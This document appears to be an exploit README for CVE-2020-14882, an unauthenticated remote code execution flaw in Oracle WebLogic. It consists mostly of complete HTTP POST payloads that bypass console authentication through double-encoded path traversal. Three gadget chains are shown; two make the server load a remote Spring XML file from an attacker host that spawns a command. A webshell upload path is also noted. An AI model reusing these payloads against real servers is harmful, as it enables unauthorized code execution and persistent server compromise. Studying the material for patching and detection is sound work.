# CVE-2020–14882 Weblogic Unauthorized bypass RCE


## ShellSession

`coherence-rest.jar#com.tangosol.coherence.mvel2.sh.ShellSession`

#### Payload

```
POST /console/images/%252E%252E%252Fconsole.portal HTTP/1.1
Host: 172.16.242.134:7001
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 117

_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession("java.lang.Runtime.getRuntime('calc.exe');");
```
![](./images/ShellSession.png)

#### Getshell

`ROOT_PATH= C:\Oracle\Middleware\Oracle_Home\user_projects\domains\base_domain\`

`Shell_path= ../../../wlserver/server/lib/consoleapp/webapp/images/xxx.jsp`

![](./images/upload.png)
![](./images/webshell-1.png)
![](./images/webshell-2.png)

[![asciicast](https://asciinema.org/a/MwvRG8zcmtmWspFHlWExVm05S.svg)](https://asciinema.org/a/MwvRG8zcmtmWspFHlWExVm05S)


## FileSystemXmlApplicationContext

`com.bea.core.repackaged.springframework.spring.jar#com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext`

```
POST /console/images/%252E%252E%252Fconsole.portal HTTP/1.1
Host: 172.16.242.134:7001
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 155

_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext("http://172.16.242.1:8989/poc.xml")
```
![](./images/FileSystemXmlApplicationContext.png)

#### poc.xml

`python -m SimpleHTTPServer`

`python -m pyftpdlib`

```
<beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
  <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
    <constructor-arg>
      <list>
        <value>cmd</value>
        <value>/c</value>
        <value><![CDATA[calc]]></value>
      </list>
    </constructor-arg>
  </bean>
</beans>
```
## ClassPathXmlApplicationContext

`com.bea.core.repackaged.springframework.spring.jar#com.bea.core.repackaged.springframework.context.support.ClassPathXmlApplicationContext`

```
POST /console/images/%252E%252E%252Fconsole.portal HTTP/1.1
Host: 192.168.28.128:7001
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 161

_nfpb=true&_pageLabel=HomePage1&handle=com.bea.core.repackaged.springframework.context.support.ClassPathXmlApplicationContext("http://172.16.242.1:8989/poc.xml")
```
![](./images/ClassPathXmlApplicationContext.png)

## 参考链接

https://testbnull.medium.com/weblogic-rce-by-only-one-get-request-cve-2020-14882-analysis-6e4b09981dbf
